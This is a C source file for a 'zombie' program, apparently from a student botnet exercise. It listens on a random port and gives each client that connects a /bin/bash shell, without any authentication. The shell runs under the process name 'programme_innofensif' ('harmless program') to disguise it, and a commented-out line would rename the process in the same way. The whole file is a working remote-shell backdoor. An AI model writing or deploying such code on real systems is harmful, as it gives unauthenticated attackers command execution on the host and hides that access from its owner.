#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/wait.h>
#include <stdio.h>
#include <unistd.h>
#define BUF_SIZE 1024
#include "utils_v2.h"
#include "messages.h"

int client_sock;

void handle_sigint(int sig)
{
    char *shutdown_message = "ZOMBIE_SHUTDOWN\n";
    write(client_sock, shutdown_message, strlen(shutdown_message));
    close(client_sock);
    exit(0);

}

// obtenir un port dispo
int getPort(int minPort, int maxPort)
{
    int sock;
    int port = randomIntBetween(minPort, maxPort);
    struct sockaddr_in addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == 0)
    {
        close(sock);
        return port;
    }

    close(sock);

    return -1;
}

int createConnection(int port)
{
    int sock;
    struct sockaddr_in addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
    {
        close(sock);
        return -1;
    }

    if (listen(sock, 1) < 0)
    {
        close(sock);
        return -1;
    }

    return sock;
}

int main()
{
    struct sigaction sa;
    sa.sa_handler = handle_sigint;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);

    int port = getPort(MIN_PORT, MAX_PORT);
    if (port == -1)
    {
        printf("Impossible de trouver un port disponible\n");
        return 1;
    }

    int sock = createConnection(port);
    if (sock < 0)
    {
        printf("Impossible de crÃ©er une connexion\n");
        return 1;
    }

    printf("Le zombie tourne sur ce port :  %d...\n", port);
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    while (1)
    {
        client_sock = accept(sock, (struct sockaddr *) &client_addr, &client_addr_len);
        if (client_sock < 0)
        {
            printf("Impossible d'accepter la connexion\n");
            return 1;
        }

        int pid = fork();

        if (pid == 0)
        {
            // FILS    

            char buffer2[BUF_SIZE];
            ssize_t uid_recu = sread(client_sock, buffer2, BUF_SIZE);
            if (uid_recu > 0)
            {
                buffer2[uid_recu] = '\0';
                printf("uid : %s\n", buffer2);
            }

            dup2(client_sock, STDIN_FILENO);
            dup2(client_sock, STDOUT_FILENO);
            dup2(client_sock, STDERR_FILENO);

            //prctl(PR_SET_NAME, "Programme innofensif",0,0,0);
            execl("/bin/bash", "programme_innofensif", NULL);
            perror("execl");
            exit(1);
        }

        sleep(1);
    }

    return 0;
}